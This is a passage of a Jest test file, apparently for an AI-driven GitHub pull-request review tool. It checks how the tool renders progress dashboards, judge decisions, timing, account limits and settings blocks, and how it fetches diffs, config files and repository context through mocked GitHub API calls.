    const data: DashboardData = {
      phase: 'complete', lineCount: 400, agentCount: 3,
      rawFindingCount: 10, keptCount: 0, droppedCount: 3,
      suppressionCount: 2, testNitSuppressedCount: 7,
    };
    const md = buildDashboard(data);
    expect(md).toContain(`${INDENT}suppressed by memory: 2\n${INDENT}suppressed: 7 test-only notes (round ≥2 throttle)`);
  });

  it('omits test-nit suppression line when testNitSuppressedCount is not set', () => {
    const data: DashboardData = {
      phase: 'complete', lineCount: 400, agentCount: 3,
      rawFindingCount: 10, keptCount: 3, droppedCount: 7,
    };
    const md = buildDashboard(data);
    expect(md).not.toMatch(/suppressed/i);
  });

  it('renders planner duration when plannerInfo and plannerDurationMs are provided', () => {
    const data: DashboardData = {
      phase: 'started', lineCount: 200, agentCount: 5,
      plannerInfo: { agentCount: 5, judgeEffort: 'high', prType: 'feat' },
      plannerDurationMs: 1200,
    };
    const md = buildDashboard(data);
    expect(md).toContain('**Planner** (1s)');
  });

  it('renders planner duration without plannerInfo, and the judge effort when it is known', () => {
    const data: DashboardData = {
      phase: 'started', lineCount: 100, agentCount: 3,
      plannerDurationMs: 850,
    };
    const md = buildDashboard(data);
    expect(md).toContain('**Planner** (850ms)');
    expect(md).not.toContain('judge effort');
    expect(buildDashboard({ ...data, judgeEffort: 'xhigh' })).toContain(`${INDENT}judge effort: xhigh`);
  });

  it('omits planner duration when plannerDurationMs is not set', () => {
    const data: DashboardData = {
      phase: 'started', lineCount: 200, agentCount: 5,
      plannerInfo: { agentCount: 5, judgeEffort: 'high', prType: 'feat' },
    };
    const md = buildDashboard(data);
    expect(md).toContain('**Planner**');
    expect(md).not.toContain('**Planner** (');
  });

  it('renders per-team counts and durations from agentProgress when planner metadata is empty (heuristic-fallback path)', () => {
    const data: DashboardData = {
      phase: 'complete', lineCount: 600, agentCount: 5,
      rawFindingCount: 18, keptCount: 12, droppedCount: 6,
      heuristicFallback: true,
      plannerDurationMs: 60000,
      agentProgress: [
        { name: 'Security & Safety', status: 'done', findingCount: 4, durationMs: 41000 },
        { name: 'Architecture & Design', status: 'done', findingCount: 3, durationMs: 38000 },
        { name: 'Correctness & Logic', status: 'done', findingCount: 5, durationMs: 45000 },
        { name: 'Testing & Coverage', status: 'done', findingCount: 4, durationMs: 36000 },
        { name: 'Performance & Efficiency', status: 'done', findingCount: 2, durationMs: 39000 },
      ],
    };
    const md = buildDashboard(data);
    expect(md).toContain('**Review:** 18 findings');
    expect(md).toContain(`${INDENT}✅ Security & Safety: 4 findings (41s)`);
    expect(md).toContain(`${INDENT}✅ Architecture & Design: 3 findings (38s)`);
    expect(md).toContain(`${INDENT}✅ Correctness & Logic: 5 findings (45s)`);
    expect(md).toContain(`${INDENT}✅ Testing & Coverage: 4 findings (36s)`);
    expect(md).toContain(`${INDENT}✅ Performance & Efficiency: 2 findings (39s)`);
    expect(md).not.toContain('0 (0ms)');
  });

  it('renders heuristic-fallback marker under the planner header when set', () => {
    const data: DashboardData = {
      phase: 'complete', lineCount: 200, agentCount: 5,
      rawFindingCount: 0, keptCount: 0, droppedCount: 0,
      heuristicFallback: true,
      plannerDurationMs: 60000,
    };
    const md = buildDashboard(data);
    const plannerIdx = md.indexOf('**Planner**');
    const reviewIdx = md.indexOf('**Review:**');
    const markerIdx = md.indexOf(`${INDENT}_(planner heuristic fallback used)_`);
    expect(markerIdx).toBeGreaterThan(plannerIdx);
    expect(markerIdx).toBeLessThan(reviewIdx);
  });

  it('names the finders a deeper review gives no more effort, under the review header', () => {
    const data: DashboardData = {
      phase: 'started', lineCount: 200, agentCount: 2,
      agentProgress: [{ name: 'Claude Sonnet 4.6 · high', status: 'reviewing' }, { name: 'Claude Opus 5.5 · xhigh', status: 'reviewing' }],
      routing: { group: 'pair', deeperSameEffort: ['Claude Sonnet 4.6 · high'] },
    };
    const note = `${INDENT}_(the deeper review adds no effort for Claude Sonnet 4.6 · high: the model receives no more effort than without it)_`;
    const md = buildDashboard(data);
    expect(md.indexOf(note)).toBeGreaterThan(md.indexOf('**Review (pair):**'));
    expect(md.indexOf(note)).toBeLessThan(md.indexOf('**Judge**'));
    expect(buildDashboard({ ...data, phase: 'complete' })).toContain(note);
    expect(buildDashboard({ ...data, routing: { group: 'pair' } })).not.toContain('adds no effort');
  });

  it('omits heuristic-fallback marker when not set', () => {
    const data: DashboardData = {
      phase: 'complete', lineCount: 200, agentCount: 5,
      rawFindingCount: 0, keptCount: 0, droppedCount: 0,
      plannerDurationMs: 850,
    };
    const md = buildDashboard(data);
    expect(md).not.toContain('planner heuristic fallback used');
  });

  it('renders judge duration in complete phase', () => {
    const data: DashboardData = {
      phase: 'complete', lineCount: 500, agentCount: 7,
      rawFindingCount: 20, keptCount: 8, droppedCount: 12,
      judgeDurationMs: 8000,
    };
    const md = buildDashboard(data);
    expect(md).toContain('**Judge:** 8 kept · 12 dropped (8s)');
  });

  it('omits judge duration when judgeDurationMs is not set', () => {
    const data: DashboardData = {
      phase: 'complete', lineCount: 500, agentCount: 7,
      rawFindingCount: 20, keptCount: 8, droppedCount: 12,
    };
    const md = buildDashboard(data);
    expect(md).toContain('**Judge:** 8 kept · 12 dropped');
    expect(md).not.toContain('**Judge:** 8 kept · 12 dropped (');
  });

  it('renders both planner and judge durations in complete phase', () => {
    const data: DashboardData = {
      phase: 'complete', lineCount: 400, agentCount: 5,
      rawFindingCount: 10, keptCount: 6, droppedCount: 4,
      plannerInfo: { agentCount: 5, judgeEffort: 'medium', prType: 'fix' },
      plannerDurationMs: 2500,
      judgeDurationMs: 65000,
    };
    const md = buildDashboard(data);
    expect(md).toContain('**Planner** (3s)');
    expect(md).toContain('**Judge:** 6 kept · 4 dropped (1m 5s)');
  });

  it('renders retrying agent status with retry count', () => {
    const data: DashboardData = {
      phase: 'started', lineCount: 100, agentCount: 3,
      agentProgress: [
        { name: 'Security & Safety', status: 'retrying', retryCount: 1 },
        { name: 'Architecture & Design', status: 'done', findingCount: 2, durationMs: 3000 },
        { name: 'Correctness & Logic', status: 'reviewing' },
      ],
    };
    const md = buildDashboard(data);
    expect(md).toContain('2/3 agents complete');
    expect(md).toContain(`${INDENT}⚠️ Security & Safety: retrying (2/2)`);
    expect(md).toContain(`${INDENT}✅ Architecture & Design: 2 findings (3s)`);
    expect(md).toContain(`${INDENT}⏳ Correctness & Logic`);
  });

  it('renders retrying agent status without retry count', () => {
    const data: DashboardData = {
      phase: 'started', lineCount: 100, agentCount: 1,
      agentProgress: [
        { name: 'Security & Safety', status: 'retrying' },
      ],
    };
    const md = buildDashboard(data);
    expect(md).toContain(`${INDENT}⚠️ Security & Safety: retrying`);
  });

  it('renders failed agent with retry count showing total attempts', () => {
    const data: DashboardData = {
      phase: 'complete', lineCount: 100, agentCount: 3,
      rawFindingCount: 5,
      agentProgress: [
        { name: 'Security & Safety', status: 'failed', durationMs: 2000, retryCount: 1 },
        { name: 'Architecture & Design', status: 'done', findingCount: 3, durationMs: 4000 },
        { name: 'Correctness & Logic', status: 'done', findingCount: 2, durationMs: 3000 },
      ],
    };
    const md = buildDashboard(data);
    expect(md).toContain(`${INDENT}🔴 Security & Safety: failed after 2 attempts (2s)`);
  });

  it('done count does not decrease when a failed agent transitions to retrying', () => {
    const agents: DashboardData['agentProgress'] = [
      { name: 'Agent A', status: 'done', findingCount: 1, durationMs: 2000 },
      { name: 'Agent B', status: 'failed', durationMs: 3000 },
      { name: 'Agent C', status: 'reviewing' },
    ];
    const base: DashboardData = {
      phase: 'started', lineCount: 100, agentCount: 3,
      agentProgress: agents,
    };
    const beforeRetry = buildDashboard(base);
    expect(beforeRetry).toContain('2/3 agents complete');

    agents[1] = { name: 'Agent B', status: 'retrying', retryCount: 1 };
    const afterRetry = buildDashboard(base);
    expect(afterRetry).toContain('2/3 agents complete');
  });

  it('renders failed agent without retry count as before', () => {
    const data: DashboardData = {
      phase: 'complete', lineCount: 100, agentCount: 3,
      rawFindingCount: 5,
      agentProgress: [
        { name: 'Security & Safety', status: 'failed', durationMs: 2000 },
        { name: 'Architecture & Design', status: 'done', findingCount: 3, durationMs: 4000 },
      ],
    };
    const md = buildDashboard(data);
    expect(md).toContain(`${INDENT}🔴 Security & Safety: failed (2s)`);
    expect(md).not.toContain('attempts');
  });
});

describe('updateProgressComment', () => {
  const mockUpdateComment = jest.fn().mockResolvedValue({});
  const mockOctokit = {
    rest: {
      issues: {
        updateComment: mockUpdateComment,
      },
    },
  } as unknown as Parameters<typeof updateProgressComment>[0];

  const baseDashboard: DashboardData = {
    phase: 'complete',
    lineCount: 200,
    agentCount: 5,
    rawFindingCount: 10,
    keptCount: 3,
    droppedCount: 7,
  };

  const baseMetadata: ReviewMetadata = {
    config: {
      reviewerModel: 'claude-sonnet-4-20250514',
      judgeModel: 'claude-sonnet-4-20250514',
      triage: 'trivial=false, subtle=true, paired=true (planner)',
      teamAgents: ['Claude Sonnet 4.6 · high', 'Claude Opus 4.7 · high'],
      memoryEnabled: true,
      memoryRepo: 'owner/review-memory',
    },
    judgeDecisions: [
      { title: 'Null dereference', severity: 'blocker', reasoning: 'Valid bug', kept: true },
      { title: 'Style nitpick', severity: 'ignore', reasoning: 'Intentional pattern', kept: false },
      { title: 'Rename', severity: 'note', reasoning: 'Clearer', kept: false, unpostedReason: 'reviewed_code' },
      { title: 'Slow path', severity: 'warning', reasoning: 'May be slow', kept: false, unpostedReason: 'unsettled_check' },
    ],
    timing: {
      parseMs: 500,
      reviewMs: 12000,
      judgeMs: 5000,
      totalMs: 17500,
    },
  };

  beforeEach(() => {
    mockUpdateComment.mockClear();
  });

  it('renders dashboard without metadata when metadata is not provided', async () => {
    await updateProgressComment(mockOctokit, 'owner', 'repo', 123, baseDashboard);
    const body = mockUpdateComment.mock.calls[0][0].body as string;
    expect(body).toContain('🔴 **Review failed**');
    expect(body).toContain('**Planner**');
    expect(body).toContain('**Judge:**');
    expect(body).not.toContain('Review metadata');
  });

  it.each([
    [45_200, '45s'],
    [252_000, '4m 12s'],
    [3_720_000, '1h 2m'],
  ])('shows a run of %ims as its total time in the finished headline, complete or not', async (ms, shown) => {
    await updateProgressComment(mockOctokit, 'owner', 'repo', 123, { ...baseDashboard, totalDurationMs: ms }, baseMetadata);
    await updateProgressComment(mockOctokit, 'owner', 'repo', 123, { ...baseDashboard, totalDurationMs: ms });
    const [complete, incomplete] = mockUpdateComment.mock.calls.map(([args]) => (args as { body: string }).body);
    expect(complete.startsWith(`✅ **Review complete** in ${shown}\n`)).toBe(true);
    expect(incomplete.startsWith(`🔴 **Review failed** in ${shown}\n`)).toBe(true);
  });

  it('marks a superseded review terminal and names the new commit', async () => {
    await markProgressCommentSuperseded(mockOctokit, 'owner', 'repo', 123, new SupersededError('abc1234ffff', 'def5678ffff'));
    const body = mockUpdateComment.mock.calls[0][0].body as string;
    expect(body).toContain('**Review superseded** by the new commit `def5678`');
    expect(body).toContain('No verdict was posted for `abc1234`');
    expect(body).toContain(CANCELLED_MARKER);

    await markProgressCommentSuperseded(mockOctokit, 'owner', 'repo', 123, new SupersededError('abc1234ffff', 'def5678ffff'), true);
    expect(mockUpdateComment.mock.calls[1][0].body).toContain('**Review superseded** by the new commit `def5678`. The review of `abc1234` was posted, and the earlier reviews stay until the new commit is reviewed.');

    await markProgressCommentSuperseded(mockOctokit, 'owner', 'repo', 123, { reviewedSha: 'abc1234ffff', headSha: 'abc1234ffff' });
    expect(mockUpdateComment.mock.calls[2][0].body).toMatch(/^\*\*Review superseded\*\* by a later review of `abc1234`, which posted its verdict\.\n/);
  });

  it('renders config section in metadata', async () => {
    await updateProgressComment(mockOctokit, 'owner', 'repo', 123, baseDashboard, baseMetadata);
    const body = mockUpdateComment.mock.calls[0][0].body as string;
    expect(body).toContain('✅ **Review complete**');
    expect(body).toContain('<summary>Review metadata</summary>');
    expect(body).toContain('**Config:**');
    expect(body).toContain('reviewer=claude-sonnet-4-20250514');
    expect(body).toContain('judge=claude-sonnet-4-20250514');
    expect(body).toContain('Triage: trivial=false, subtle=true, paired=true (planner)');
    expect(body).toContain('Team: Claude Sonnet 4.6 · high, Claude Opus 4.7 · high');
    expect(body).toContain('enabled (owner/review-memory)');
    expect(body).not.toContain('**Account limits:**');
  });

  it('lists each account\'s limit windows in metadata', async () => {
    const resetsAt = Date.UTC(2026, 10, 12, 14) / 1000;
    const limits = [
      { account: 'Claude subscription', window: '5-hour', usedPercent: 37, resetsAt },
      { account: 'ChatGPT subscription', window: 'weekly', usedPercent: 12 },
      { account: 'Claude subscription', window: 'weekly', usedPercent: 85, resetsAt },
    ];
    await updateProgressComment(mockOctokit, 'owner', 'repo', 123, baseDashboard, { ...baseMetadata, limits });
    const body = mockUpdateComment.mock.calls[0][0].body as string;
    expect(body).toContain([
      '**Account limits:**',
      '- Claude subscription: 5-hour 37% (resets 2026-11-12 14:00 UTC), weekly 85% (resets 2026-11-12 14:00 UTC)',
      '- ChatGPT subscription: weekly 12%',
      '',
    ].join('\n'));
  });

  it('renders judge decisions as kept or dropped', async () => {
    await updateProgressComment(mockOctokit, 'owner', 'repo', 123, baseDashboard, baseMetadata);
    const body = mockUpdateComment.mock.calls[0][0].body as string;
    expect(body).toContain('**Judge decisions:**');
    expect(body).toContain('- Kept: "Null dereference" (blocker): "Valid bug"');
    expect(body).toContain('- Dropped: "Style nitpick" (ignore): "Intentional pattern"');
    expect(body).toContain('- Not listed, on code an earlier round reviewed: "Rename" (note): "Clearer"');
    expect(body).toContain('- Not listed, a tool check could not confirm it: "Slow path" (warning): "May be slow"');
  });

  it('does not render recap section in metadata', async () => {
    await updateProgressComment(mockOctokit, 'owner', 'repo', 123, baseDashboard, baseMetadata);
    const body = mockUpdateComment.mock.calls[0][0].body as string;
    expect(body).not.toContain('**Recap:**');
  });

  it('renders timing section', async () => {
    await updateProgressComment(mockOctokit, 'owner', 'repo', 123, baseDashboard, baseMetadata);
    const body = mockUpdateComment.mock.calls[0][0].body as string;
    expect(body).toContain('**Timing:**');
    expect(body).toContain('Parse: 0.5s');
    expect(body).toContain('Review agents: 12.0s');
    expect(body).toContain('Judge: 5.0s');
    expect(body).toContain('Total: 17.5s');
  });

  it('omits judge decisions section when empty', async () => {
    const metadata: ReviewMetadata = { ...baseMetadata, judgeDecisions: [] };
    await updateProgressComment(mockOctokit, 'owner', 'repo', 123, baseDashboard, metadata);
    const body = mockUpdateComment.mock.calls[0][0].body as string;
    expect(body).not.toContain('**Judge decisions:**');
  });

  it('shows memory disabled when not enabled', async () => {
    const metadata: ReviewMetadata = {
      ...baseMetadata,
      config: { ...baseMetadata.config, memoryEnabled: false, memoryRepo: '' },
    };
    await updateProgressComment(mockOctokit, 'owner', 'repo', 123, baseDashboard, metadata);
    const body = mockUpdateComment.mock.calls[0][0].body as string;
    expect(body).toContain('Memory: disabled');
  });

  it('forces dashboard phase to complete', async () => {
    const dashboard: DashboardData = { ...baseDashboard, phase: 'reviewed' };
    await updateProgressComment(mockOctokit, 'owner', 'repo', 123, dashboard, baseMetadata);
    const body = mockUpdateComment.mock.calls[0][0].body as string;
    expect(body).toContain('**Judge:** 3 kept · 7 dropped');
    expect(body).not.toContain('evaluating');
  });

  it('includes REVIEW_COMPLETE_MARKER in the updated comment body', async () => {
    await updateProgressComment(mockOctokit, 'owner', 'repo', 123, baseDashboard);
    const body = mockUpdateComment.mock.calls[0][0].body as string;
    expect(body.startsWith('🔴 **Review failed**')).toBe(true);
    expect(body.endsWith(`${TRAILING_MARKERS}\n${REVIEW_COMPLETE_MARKER}`)).toBe(true);
  });

});

describe('fetchPRDiff', () => {
  it('fetches the raw diff string', async () => {
    const mockOctokit = {
      rest: {
        pulls: {
          get: jest.fn().mockResolvedValue({ data: 'diff --git a/file.ts b/file.ts' }),
        },
      },
    } as unknown as Parameters<typeof fetchPRDiff>[0];

    const result = await fetchPRDiff(mockOctokit, 'owner', 'repo', 1);
    expect(result).toBe('diff --git a/file.ts b/file.ts');
    expect(mockOctokit.rest.pulls.get).toHaveBeenCalledWith({
      owner: 'owner',
      repo: 'repo',
      pull_number: 1,
      mediaType: { format: 'diff' },
    });
  });
});

describe('fetchInterRoundDiff', () => {
  function makeOctokit(compareCommits: jest.Mock): Parameters<typeof fetchInterRoundDiff>[0] {
    return {
      rest: { repos: { compareCommits } },
    } as unknown as Parameters<typeof fetchInterRoundDiff>[0];
  }

  it('maps each file of a comparison to its full blob sha with `fetchBlobShas`, leaving out a file without one', async () => {
    const compareCommits = jest.fn().mockResolvedValue({ data: { files: [{ filename: 'app.jar', sha: 'a'.repeat(40) }, { filename: 'big.bin' }] } });
    expect(await fetchBlobShas(makeOctokit(compareCommits), 'owner', 'repo', 'main', 'head')).toEqual(new Map([['app.jar', 'a'.repeat(40)]]));
    expect(compareCommits).toHaveBeenCalledWith({ owner: 'owner', repo: 'repo', base: 'main', head: 'head', per_page: 1 });
  });

  it('lists the commits a head adds on one line of history with `fetchCommitsSince`, and none after a rebase, a merge or past one page', async () => {
    const commit = (sha: string, parents = 1) => ({ sha, parents: Array.from({ length: parents }, () => ({ sha: 'p' })) });
    const since = (data: object) => fetchCommitsSince(makeOctokit(jest.fn().mockResolvedValue({ data })), 'owner', 'repo', 'base', 'head');
    expect(await since({ status: 'ahead', total_commits: 2, commits: [commit('a'), commit('b')] })).toEqual(['a', 'b']);
    expect(await since({ status: 'diverged', total_commits: 2, commits: [commit('a'), commit('b')] })).toEqual([]);
    expect(await since({ status: 'ahead', total_commits: 2, commits: [commit('a'), commit('m', 2)] })).toEqual([]);
    expect(await since({ status: 'ahead', total_commits: 120, commits: [commit('a')] })).toEqual([]);
  });

  it('returns empty string when base equals head and skips the API call', async () => {
    const compareCommits = jest.fn();
    const result = await fetchInterRoundDiff(makeOctokit(compareCommits), 'owner', 'repo', 'sha', 'sha');
    expect(result).toBe('');
    expect(compareCommits).not.toHaveBeenCalled();
  });

  it('returns empty string for missing base or head and skips the API call', async () => {
    const compareCommits = jest.fn();
    expect(await fetchInterRoundDiff(makeOctokit(compareCommits), 'owner', 'repo', '', 'head')).toBe('');
    expect(await fetchInterRoundDiff(makeOctokit(compareCommits), 'owner', 'repo', 'base', '')).toBe('');
    expect(compareCommits).not.toHaveBeenCalled();
  });

  it('returns the unified diff string on success', async () => {
    const diffPayload = 'diff --git a/x b/x\n@@ -1 +1 @@\n-old\n+new\n';
    const compareCommits = jest.fn().mockResolvedValue({ data: diffPayload });
    const result = await fetchInterRoundDiff(makeOctokit(compareCommits), 'owner', 'repo', 'base', 'head');
    expect(result).toBe(diffPayload);
    expect(compareCommits).toHaveBeenCalledWith({
      owner: 'owner', repo: 'repo', base: 'base', head: 'head',
      mediaType: { format: 'diff' },
    });
  });

  it('returns empty string when the compare API returns a non-string payload', async () => {
    const compareCommits = jest.fn().mockResolvedValue({ data: { files: [] } });
    const result = await fetchInterRoundDiff(makeOctokit(compareCommits), 'owner', 'repo', 'base', 'head');
    expect(result).toBe('');
  });

  it('rethrows on API failure and logs a debug message', async () => {
    const debugSpy = jest.spyOn(core, 'debug').mockImplementation(() => {});
    const apiError = new Error('Not found');
    const compareCommits = jest.fn().mockRejectedValue(apiError);
    await expect(
      fetchInterRoundDiff(makeOctokit(compareCommits), 'owner', 'repo', 'base', 'head'),
    ).rejects.toBe(apiError);
    expect(debugSpy).toHaveBeenCalledWith(expect.stringContaining('Failed to fetch inter-round diff base..head'));
    debugSpy.mockRestore();
  });
});

describe('fetchConfigFile', () => {
  it('returns decoded file content', async () => {
    const content = 'auto_review: true';
    const mockOctokit = {
      rest: {
        repos: {
          getContent: jest.fn().mockResolvedValue({
            data: {
              content: Buffer.from(content).toString('base64'),
              encoding: 'base64',
            },
          }),
        },
      },
    } as unknown as Parameters<typeof fetchConfigFile>[0];

    const result = await fetchConfigFile(mockOctokit, 'owner', 'repo', 'main', '.manki.yml');
    expect(result).toBe(content);
  });

  it('returns null when file is not found', async () => {
    const mockOctokit = {
      rest: {
        repos: {
          getContent: jest.fn().mockRejectedValue(new Error('Not found')),
        },
      },
    } as unknown as Parameters<typeof fetchConfigFile>[0];

    const result = await fetchConfigFile(mockOctokit, 'owner', 'repo', 'main', '.manki.yml');
    expect(result).toBeNull();
  });

  it('lets `readConfigFile` tell a missing file from one that cannot be read', async () => {
    const octokitRejecting = (error: Error) => ({
      rest: { repos: { getContent: jest.fn().mockRejectedValue(error) } },
    } as unknown as Parameters<typeof readConfigFile>[0]);
    const notFound = octokitRejecting(Object.assign(new Error('Not Found'), { status: 404 }));
    const serverError = octokitRejecting(Object.assign(new Error('Server Error'), { status: 502 }));

    await expect(readConfigFile(notFound, 'owner', 'repo', 'main', '.manki.yml')).resolves.toBeNull();
    await expect(readConfigFile(serverError, 'owner', 'repo', 'main', '.manki.yml')).rejects.toThrow('Server Error');
    // A file over 1 MB is there, and comes back without its content.
    const tooLarge = { rest: { repos: { getContent: jest.fn().mockResolvedValue({ data: { type: 'file', content: '', encoding: 'none' } }) } } } as unknown as Parameters<typeof readConfigFile>[0];
    await expect(readConfigFile(tooLarge, 'owner', 'repo', 'main', 'src/big.ts')).rejects.toThrow('src/big.ts is too large to read');
    await expect(fetchConfigFile(serverError, 'owner', 'repo', 'main', '.manki.yml')).resolves.toBeNull();
  });

  it('returns null when data has no content field', async () => {
    const mockOctokit = {
      rest: {
        repos: {
          getContent: jest.fn().mockResolvedValue({
            data: { type: 'dir', entries: [] },
          }),
        },
      },
    } as unknown as Parameters<typeof fetchConfigFile>[0];

    const result = await fetchConfigFile(mockOctokit, 'owner', 'repo', 'main', '.manki.yml');
    expect(result).toBeNull();
  });
});

describe('fetchRepoContext', () => {
  it('fetches root CLAUDE.md, AGENTS.md and repo description', async () => {
    const files: Record<string, string> = { 'CLAUDE.md': 'Root instructions', 'AGENTS.md': 'Agent instructions' };
    const mockOctokit = {
      rest: {
        repos: {
          getContent: jest.fn().mockImplementation(({ path }: { path: string }) => {
            if (files[path]) {
              return Promise.resolve({
                data: {
                  content: Buffer.from(files[path]).toString('base64'),
                  encoding: 'base64',
                },
              });
            }
            throw new Error('Not found');
          }),
          get: jest.fn().mockResolvedValue({
            data: { full_name: 'owner/repo', description: 'A test repo' },
          }),
        },
      },
    } as unknown as Parameters<typeof fetchRepoContext>[0];

    const { text: result } = await fetchRepoContext(mockOctokit, 'owner', 'repo', 'main', []);
    expect(result).toContain('Repository: owner/repo');
    expect(result).toContain('A test repo');
    expect(result).toContain('Root instructions');
    expect(result).toContain('## AGENTS.md\n\nAgent instructions');
  });

  it('returns empty string when no context files exist', async () => {
    const mockOctokit = {
      rest: {
        repos: {
          getContent: jest.fn().mockRejectedValue(new Error('Not found')),
          get: jest.fn().mockRejectedValue(new Error('Not found')),
        },
      },
    } as unknown as Parameters<typeof fetchRepoContext>[0];

    const { text: result } = await fetchRepoContext(mockOctokit, 'owner', 'repo', 'main', []);
    expect(result).toBe('');
  });
});

describe('postProgressComment', () => {
  it('posts a progress comment, returns its ID and saves it for the post step', async () => {
    const saveState = jest.spyOn(core, 'saveState').mockImplementation(() => {});
    const createCommentMock = jest.fn().mockResolvedValue({ data: { id: 42 } });
    const mockOctokit = {
      rest: {
        issues: {
          createComment: createCommentMock,
        },
      },
    } as unknown as Parameters<typeof postProgressComment>[0];

    const id = await postProgressComment(mockOctokit, 'owner', 'repo', 1);
    expect(id).toBe(42);
    const body = createCommentMock.mock.calls[0][0].body as string;
    expect(body).toMatch(new RegExp(`^\\*\\*Review started\\*\\*\\n\\n${BOT_MARKER}\\n<!-- manki-version: [^>]+ -->$`));
    expect(saveState).toHaveBeenCalledWith('manki_progress_comment', '42');
    saveState.mockRestore();
  });

  it('uses dashboard data when provided', async () => {
    const createCommentMock = jest.fn().mockResolvedValue({ data: { id: 43 } });
    const mockOctokit = {
      rest: {
        issues: {
          createComment: createCommentMock,
        },
      },
    } as unknown as Parameters<typeof postProgressComment>[0];

    const dashboard: DashboardData = { phase: 'started', lineCount: 100, agentCount: 3 };
    const id = await postProgressComment(mockOctokit, 'owner', 'repo', 1, dashboard);
    expect(id).toBe(43);
    const body = createCommentMock.mock.calls[0][0].body as string;
    expect(body).toContain('100 lines');
    expect(body).toContain('3 agents');
  });
});

describe('updateProgressDashboard', () => {
  it('updates comment with dashboard content', async () => {
    const updateCommentMock = jest.fn().mockResolvedValue({});
    const mockOctokit = {
      rest: {
        issues: {
          updateComment: updateCommentMock,
        },
      },
    } as unknown as Parameters<typeof updateProgressDashboard>[0];

    const dashboard: DashboardData = { phase: 'reviewed', lineCount: 200, agentCount: 5, rawFindingCount: 8 };
    await updateProgressDashboard(mockOctokit, 'owner', 'repo', 123, dashboard);
    const body = updateCommentMock.mock.calls[0][0].body as string;
    expect(body).toContain(BOT_MARKER);
    expect(body).toContain('8 findings');
  });

  it('ends with the settings block, keeping a box a person ticked on the live comment, unless the comment lost its block', async () => {
    const warningSpy = jest.spyOn(core, 'warning').mockImplementation(() => {});
    const running: SettingsView = { head: 'abc1234', status: 'review running', boxes: new Set(['pause', 'again', 'cancel']), ticked: new Set() };
    const live = withSettingsBlock('**Review in progress**', running).replace('- [ ] Pause', '- [x] Pause');
    const updateCommentMock = jest.fn().mockResolvedValue({});
    const getCommentMock = jest.fn().mockResolvedValueOnce({ data: { body: live } }).mockRejectedValueOnce(new Error('boom'))
      .mockResolvedValueOnce({ data: { body: '**Review in progress**' } });
    const mockOctokit = { rest: { issues: { updateComment: updateCommentMock, getComment: getCommentMock } } } as unknown as Parameters<typeof updateProgressDashboard>[0];
    const dashboard: DashboardData = { phase: 'reviewed', lineCount: 200, agentCount: 5, rawFindingCount: 8 };

    await updateProgressDashboard(mockOctokit, 'owner', 'repo', 123, dashboard, running);
    const body = updateCommentMock.mock.calls[0][0].body as string;
    expect(body).toContain('8 findings');
    expect(parseSettingsBlock(body)).toEqual({ ...running, ticked: new Set(['pause']) });

    await updateProgressDashboard(mockOctokit, 'owner', 'repo', 123, dashboard, running);
    expect(parseSettingsBlock(updateCommentMock.mock.calls[1][0].body)).toEqual(running);
    expect(warningSpy).toHaveBeenCalledWith(expect.stringContaining('Failed to read the ticked settings boxes'));
    warningSpy.mockRestore();

    // A newer progress comment took the block, so this one stays without it.
    await updateProgressDashboard(mockOctokit, 'owner', 'repo', 123, dashboard, running);
    expect(updateCommentMock.mock.calls[2][0].body).not.toContain('manki-settings');
  });
});

describe('settings block placement', () => {
  type Octokit = ReturnType<typeof import('@actions/github').getOctokit>;
  const view: SettingsView = { lastReviewed: 'aaa1111', head: 'bbb2222', status: 'review running', boxes: new Set(['pause', 'again', 'cancel']), ticked: new Set() };

  function makeOctokit(comments: Array<{ id: number; body: string; login?: string }>) {
    const updateComment = jest.fn().mockResolvedValue({});
    const createComment = jest.fn().mockResolvedValue({ data: { id: 99 } });
    const getComment = jest.fn(async ({ comment_id }: { comment_id: number }) => ({ data: { body: comments.find(c => c.id === comment_id)?.body } }));
    const data = comments.map(c => ({ id: c.id, body: c.body, user: { login: c.login ?? BOT_LOGIN, type: 'Bot' }, updated_at: '2026-01-01T00:00:00Z' }));
    const octokit = { paginate: jest.fn().mockResolvedValue(data), rest: { issues: { listComments: jest.fn(), updateComment, createComment, getComment } } } as unknown as Octokit;
    return { octokit, updateComment, createComment, getComment, data };
  }

  it('shows a status in the existing block, keeping its ticks and last reviewed commit unless given one', async () => {
    const ticked = withSettingsBlock(withMarkers('**Review complete**', BOT_MARKER), { ...view, ticked: new Set(['pause']) });
    const { octokit, updateComment, createComment } = makeOctokit([
      { id: 1, body: withSettingsBlock('Spoofed', view), login: 'someone' },
      { id: 2, body: ticked },
    ]);

    await showSettings(octokit, TEST_BOT, 'owner', 'repo', 1, { head: 'ccc3333', status: 'up to date', boxes: new Set(['pause', 'again']), ticked: new Set() }, 'Unused');
    expect(createComment).not.toHaveBeenCalled();
    expect(updateComment).toHaveBeenCalledWith(expect.objectContaining({ comment_id: 2 }));
    const body = updateComment.mock.calls[0][0].body as string;
    expect(body.startsWith(withMarkers('**Review complete**', BOT_MARKER))).toBe(true);
    expect(parseSettingsBlock(body)).toEqual({ lastReviewed: 'aaa1111', head: 'ccc3333', status: 'up to date', boxes: new Set(['pause', 'again']), ticked: new Set(['pause']) });

    await showSettings(octokit, TEST_BOT, 'owner', 'repo', 1, { lastReviewed: 'ccc3333', head: 'ccc3333', status: 'up to date', boxes: new Set(['pause']), ticked: new Set() }, 'Unused');
    expect(parseSettingsBlock(updateComment.mock.calls[1][0].body)?.lastReviewed).toBe('ccc3333');
  });

  it('posts the text with the block when no comment of Manki has one, marked so it never reads as a run in progress', async () => {
    const { octokit, createComment } = makeOctokit([{ id: 1, body: withMarkers('**Review complete**', BOT_MARKER) }]);

    await showSettings(octokit, TEST_BOT, 'owner', 'repo', 1, view, 'This PR is a draft.');
    const body = createComment.mock.calls[0][0].body as string;
    expect(body.startsWith('This PR is a draft.')).toBe(true);
    expect(body).toContain(REVIEW_COMPLETE_MARKER);
    expect(body.endsWith(renderSettingsBlock(view))).toBe(true);
  });

  it('removes the block from every comment of Manki but the one to keep, from the comment as it is now', async () => {
    const { octokit, updateComment, getComment, data } = makeOctokit([
      { id: 1, body: withSettingsBlock('Newest', view) },
      { id: 2, body: withSettingsBlock('Older', view) },
      { id: 3, body: withSettingsBlock('Not Manki', view), login: 'someone' },
      { id: 4, body: 'No block' },
    ]);
    getComment.mockResolvedValueOnce({ data: { body: withSettingsBlock('Older, now complete', view) } });

    await retireSettingsBlocks(octokit, TEST_BOT, 'owner', 'repo', data, 1);
    expect(updateComment).toHaveBeenCalledTimes(1);
    expect(updateComment).toHaveBeenCalledWith({ owner: 'owner', repo: 'repo', comment_id: 2, body: 'Older, now complete' });
  });

  it('moves a block onto a comment as it is now, and only warns when that fails', async () => {
